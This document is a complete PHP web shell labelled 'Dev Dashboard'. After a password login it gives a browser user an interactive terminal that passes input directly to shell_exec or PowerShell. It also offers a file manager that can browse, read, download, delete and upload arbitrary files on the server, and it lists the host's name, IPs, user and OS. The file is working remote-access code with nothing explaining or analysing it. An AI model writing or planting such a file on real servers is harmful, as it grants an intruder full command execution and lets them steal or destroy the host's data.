<?php
session_start();

/* ===== CONFIG ===== */
define('AUTH_USER','admin');
define('AUTH_PASS_HASH','$2y$10$ZsoL/V5bjWlOzD8SaPCpoepmB5Vphur/54Z4gAd9szpXqlVfIE0h6');
$timeout=900;

/* ===== SESSION ===== */
if(isset($_SESSION['LAST_ACTIVITY']) && time()-$_SESSION['LAST_ACTIVITY']>$timeout){
    session_destroy(); session_unset();
}
$_SESSION['LAST_ACTIVITY']=time();

/* ===== LOGIN ===== */
if(isset($_POST['login'])){
    if(hash_equals(AUTH_USER,$_POST['username']??'') &&
       password_verify($_POST['password']??'',AUTH_PASS_HASH)){
        session_regenerate_id(true);
        $_SESSION['auth']=1;
        header("Location: ".$_SERVER['PHP_SELF']); exit;
    } else $error="Invalid credentials";
}

/* ===== LOGOUT ===== */
if(isset($_GET['logout'])){
    session_destroy(); session_unset();
    header("Location: ".$_SERVER['PHP_SELF']); exit;
}

/* ===== BLOCK ===== */
if(empty($_SESSION['auth'])):
?>
<!DOCTYPE html><html><head>
<title>Login</title>
<style>body{margin:0;height:100vh;display:flex;justify-content:center;align-items:center;background:#111;font-family:sans-serif}form{background:#222;padding:25px;border-radius:8px;text-align:center}input,button{width:100%;padding:8px;margin:6px 0;border:0;border-radius:4px}button{background:#0f62fe;color:#fff;cursor:pointer}</style>
</head><body>
<form method="post">
<h3 style="color:#fff;margin:0 0 10px">Dev Login</h3>
<?=!empty($error)?"<div style='color:red'>$error</div>":''?>
<input name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button name="login">Login</button>
</form></body></html>
<?php exit; endif;

/* ===== CORE ===== */
$cwd = $_GET['cwd'] ?? $_POST['cwd'] ?? getcwd();
$cmd = $_POST['cmd'] ?? '';
$mode = $_POST['mode'] ?? 'shell';
if(isset($_GET['dir']) && is_dir($_GET['dir'])) $cwd=realpath($_GET['dir']);

if(isset($_GET['delete']) && file_exists($_GET['delete'])){
    unlink($_GET['delete']);
    echo "<p style='color:green;'>Deleted ".htmlspecialchars($_GET['delete'])."</p>";
}

if(isset($_GET['download']) && file_exists($_GET['download'])){
    header('Content-Disposition: attachment; filename="'.basename($_GET['download']).'"');
    header('Content-Type: application/octet-stream');
    readfile($_GET['download']); exit;
}

$view_content=$view_file=null;
if(isset($_GET['view']) && is_file($_GET['view'])){
    $view_file=$_GET['view'];
    $view_content=htmlspecialchars(file_get_contents($view_file));
}

if($_FILES['upload']['tmp_name']??0){
    $dest=$cwd.DIRECTORY_SEPARATOR.basename($_FILES['upload']['name']);
    echo move_uploaded_file($_FILES['upload']['tmp_name'],$dest)
        ?"<p style='color:green;'>Uploaded ".htmlspecialchars($dest)." (".$_FILES['upload']['size']." bytes)</p>"
        :"<p style='color:red;'>Upload failed!</p>";
}

function sys_info(){
    return [
        'Hostname'=>gethostname(),
        'Current User'=>get_current_user(),
        'Server IP'=>$_SERVER['SERVER_ADDR']??gethostbyname(gethostname()),
        'Client IP'=>$_SERVER['REMOTE_ADDR']??'Unknown',
        'Server Software'=>$_SERVER['SERVER_SOFTWARE']??'Unknown',
        'Server Port'=>$_SERVER['SERVER_PORT']??'Unknown',
        'Document Root'=>$_SERVER['DOCUMENT_ROOT']??'Unknown',
        'OS Info'=>php_uname('a')
    ];
}
function exec_command($cmd, $mode) {
    if (!$cmd) return '';
    if ($mode === 'shell') {
        return shell_exec($cmd . ' 2>&1');
    } elseif ($mode === 'powershell' && strtoupper(substr(PHP_OS,0,3)) === 'WIN') {
        return shell_exec("powershell -Command \"$cmd\" 2>&1");
    } else {
        return "Unsupported mode or OS.";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Dev Dashboard</title>
<style>
body{margin:0;font-family:"Segoe UI",Tahoma,Geneva,Verdana,sans-serif;background:#f7f9fc;color:#333;height:100vh;display:flex;flex-direction:column}
header{background:#3f51b5;color:#fff;padding:1rem 2rem;font-size:1.25rem;font-weight:700;box-shadow:0 2px 6px rgb(0 0 0 / .2)}
main{flex:1;display:flex;gap:1rem;padding:1rem 2rem;overflow:hidden}
section{background:#fff;border-radius:8px;box-shadow:0 0 8px rgb(0 0 0 / .1);padding:1rem;overflow-y:auto}
#file-manager{flex:1.5;display:flex;flex-direction:column;overflow:hidden}
#file-manager table{width:100%;border-collapse:collapse}
#file-manager th,#file-manager td{padding:.5rem .75rem;text-align:left;border-bottom:1px solid #eee;font-family:monospace}
#file-manager th{background:#f0f0f0}
#file-manager tbody tr:hover{background:#e3eaff}
#file-manager a.action-btn{margin-right:.5rem;text-decoration:none;font-weight:bold;padding:.2rem .4rem;border-radius:4px;color:#fff;font-family:"Segoe UI",Tahoma,Geneva,Verdana,sans-serif}
a.view{background:#2196f3}a.download{background:#4caf50}a.delete{background:#f44336}a.folder{color:#fbc02d;font-weight:700}
#system-info{flex:.5}#system-info ul{list-style:none;padding:0;font-family:monospace}#system-info li{padding:2px;font-size:1.4vh;}
.fm-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;gap:10px}
.fm-header h2{margin:0;font-size:1.3em;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1}
</style>
</head>
<body>

<header style="display:flex;justify-content:space-between;align-items:center;">
<div style="font-size:20px;"><a href="<?=$_SERVER['PHP_SELF']?>" style="color:#fff;text-decoration:none;">Dev Dashboard</a></div>
<div><a href="?logout=true" style="color:#fff;text-decoration:none;padding:6px 12px;border-radius:4px;font-size:15px;">Logout</a></div>
</header>

<main>
<section id="file-manager">
<div class="fm-header">
<h2>File Manager: <?=htmlspecialchars($cwd)?></h2>
<form method="post" enctype="multipart/form-data" style="margin:0;">
<input type="hidden" name="cwd" value="<?=htmlspecialchars($cwd)?>">
<input type="file" name="upload" required>
<button type="submit">Upload</button>
</form>
</div>

<div style="flex:1;overflow:auto;">
<table><thead><tr>
<th>Name</th><th>Size</th><th>Modified</th><th>Actions</th>
</tr></thead><tbody>
<?php
$parent=dirname($cwd);
if($parent!==$cwd)
echo "<tr><td colspan='4'><a href='?dir=".urlencode($parent)."&cwd=".urlencode($parent)."' class='folder'>.. (Parent Directory)</a></td></tr>";

foreach(scandir($cwd) as $f):
if($f=='.'||$f=='..') continue;
$p=$cwd.DIRECTORY_SEPARATOR.$f;
$is=is_dir($p);
?>
<tr>
<td><?=$is?"<a href='?dir=".urlencode($p)."&cwd=".urlencode($p)."' class='folder'>&#128193; ".htmlspecialchars($f)."</a>":"&#128459; ".htmlspecialchars($f)?></td>
<td><?=$is?"Folder":number_format(filesize($p))." Bytes"?></td>
<td><?=date("Y-m-d H:i:s",filemtime($p))?></td>
<td><?=$is?"-":"<a href='?view=".urlencode($p)."&cwd=".urlencode($cwd)."' class='action-btn view'>👁️</a>
<a href='?download=".urlencode($p)."&cwd=".urlencode($cwd)."' class='action-btn download'>⬇️</a>
<a href='?delete=".urlencode($p)."&cwd=".urlencode($cwd)."' onclick=\"return confirm('Delete ".htmlspecialchars($f)."?');\" class='action-btn delete'>🗑️</a>"?></td>
</tr>
<?php endforeach;?>
</tbody></table>
</div>

<?php if($view_content!==null): ?>
<hr>
<p style="margin:10px 0;font-size:1.17em;font-weight:bold;">File Viewer: <?=htmlspecialchars($view_file)?></p>
<pre style="background:black;color:#00ff00;padding:10px;overflow:auto;flex:1;margin:0;"><?=$view_content?></pre>
<?php endif; ?>

</section>

<section style="flex:1;display:flex;flex-direction:column;gap:1rem;">
<div id="system-info">
<h2>System Info</h2>
<ul>
<?php foreach(sys_info() as $k=>$v): ?>
<li><strong><?=$k?>:</strong> <?=htmlspecialchars($v)?></li>
<?php endforeach;?>
</ul>
</div>

<div id="terminal" style="flex:3;display:flex;flex-direction:column;text-align:top;">
<h2>Interactive Terminal</h2>

<form method="post" style="display:flex;gap:0.5rem;margin-bottom:0.5rem;">

<select name="mode"
style="font-family:monospace;font-size:1rem;padding:0.3rem 0.5rem;border:1px solid #ccc;border-radius:4px;">
<option value="shell" <?php if($mode==='shell') echo 'selected'; ?>>Shell</option>
<option value="powershell" <?php if($mode==='powershell') echo 'selected'; ?>>PowerShell</option>
</select>

<input type="text" name="cmd" required
style="flex:1;font-family:monospace;font-size:1rem;padding:0.3rem 0.5rem;border:1px solid #ccc;border-radius:4px;">

<input type="hidden" name="cwd" value="<?php echo htmlspecialchars($cwd); ?>">

<button type="submit"
style="background:#3f51b5;border:none;color:#fff;padding:0 1rem;border-radius:4px;font-weight:700;cursor:pointer;transition:background-color 0.3s ease;"
onmouseover="this.style.backgroundColor='#303f9f'"
onmouseout="this.style.backgroundColor='#3f51b5'">
Run ▶
</button>

</form>

<pre id="output"
style="flex:1;background:#1e1e1e;color:#d4d4d4;font-family:monospace;padding:1rem;border-radius:6px;overflow-y:auto;white-space:pre-wrap;box-shadow:inset 0 0 5px rgba(0,0,0,0.5);">
<?php
if ($cmd) {
    echo htmlspecialchars(exec_command($cmd, $mode));
}
?>
</pre>

</div>

</section>
</main>
</body>
</html>
